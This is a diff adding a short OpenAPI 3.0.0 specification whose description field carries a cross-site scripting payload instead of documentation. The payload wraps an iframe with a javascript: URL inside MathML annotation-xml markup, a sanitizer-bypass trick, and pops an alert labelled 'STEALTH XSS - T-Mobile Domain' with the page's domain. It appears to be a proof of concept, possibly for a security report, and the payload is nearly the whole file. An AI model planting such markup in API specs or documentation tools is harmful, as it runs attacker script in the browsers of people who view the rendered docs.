@@ -1,0 +1,12 @@
+openapi: 3.0.0
+info:
+  title: API
+  description: |
+    <details open>
+    <summary>Documentation</summary>
+    <math><semantics><annotation-xml encoding="text/html">
+    <iframe src="javascript:alert('STEALTH XSS - T-Mobile Domain: ' + document.domain)"></iframe>
+    </annotation-xml></semantics></math>
+    </details>
+  version: 1.0.0
+paths: {}
